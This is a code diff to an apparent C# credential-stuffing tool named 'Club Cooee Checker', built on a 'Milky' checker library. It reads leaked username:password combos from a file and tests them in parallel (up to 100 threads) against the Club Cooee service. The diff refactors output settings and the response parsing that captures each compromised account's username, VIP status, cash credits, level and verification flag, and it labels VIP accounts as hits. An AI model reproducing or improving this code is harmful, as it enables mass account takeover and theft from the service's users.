@@ -14,19 +14,25 @@ namespace Milky.Examples
     {
         public static async Task Main()
         {
-            var checkerSettings = new CheckerSettings(maxThreads: 100)
+            var checkerSettings = new CheckerSettings(maxThreads: 100, useProxies: false);
+
+            var outputSettings = new OutputSettings()
             {
-                UseProxies = false,
                 OutputDirectory = "Results",
-                OutputInvalids = false
+                OutputInvalids = false,
+                CaptureSeparator = " | ",
+                HitColor = ConsoleColor.Green,
+                FreeColor = ConsoleColor.Cyan,
+                InvalidColor = ConsoleColor.Red
             };
 
             var checker = new CheckerBuilder(checkerSettings, Check)
+                .WithOutputSettings(outputSettings)
                 .WithCombos(File.ReadAllLines("combos.txt"))
                 .Build();
 
             var consoleManager = new ConsoleManager(checker);
-            _ = consoleManager.StartUpdatingTitleAsync(updateInterval: TimeSpan.FromMilliseconds(33), showFree: true, showPercentages: true, prefix: "Club Cooee Checker — ");
+            _ = consoleManager.StartUpdatingTitleAsync(updateInterval: TimeSpan.FromMilliseconds(33), showFree: true, showPercentages: true, prefix: "Club Cooee Checker — ", suffix: null);
             _ = consoleManager.StartListeningKeysAsync(pauseKey: ConsoleKey.P, resumeKey: ConsoleKey.R, endKey: null);
 
             await checker.StartAsync();
@@ -52,13 +58,15 @@ namespace Milky.Examples
                     return new CheckResult(ComboResult.Invalid);
                 }
 
+                JsonElement user = responseJson.GetProperty("msg").GetProperty("userdata").GetProperty("auth");
+
                 var captures = new Dictionary<string, object>()
                 {
-                    { "Username", responseJson.GetProperty("name").GetString() },
-                    { "VIP", responseJson.GetProperty("premium").GetBoolean() },
-                    { "Cash", responseJson.GetProperty("credits").GetString() },
-                    { "Level", responseJson.GetProperty("xp_level").GetInt16() },
-                    { "Email confirmed", responseJson.GetProperty("email_confirmed").GetBoolean() }
+                    { "Username", user.GetProperty("name").GetString() },
+                    { "VIP", user.GetProperty("premium").GetBoolean() },
+                    { "Cash", user.GetProperty("credits").GetString() },
+                    { "Level", user.GetProperty("xp_level").GetInt16() },
+                    { "Verified", user.GetProperty("email_confirmed").GetBoolean() }
                 };
 
                 return new CheckResult((bool)captures["VIP"] ? ComboResult.Hit : ComboResult.Free, captures);
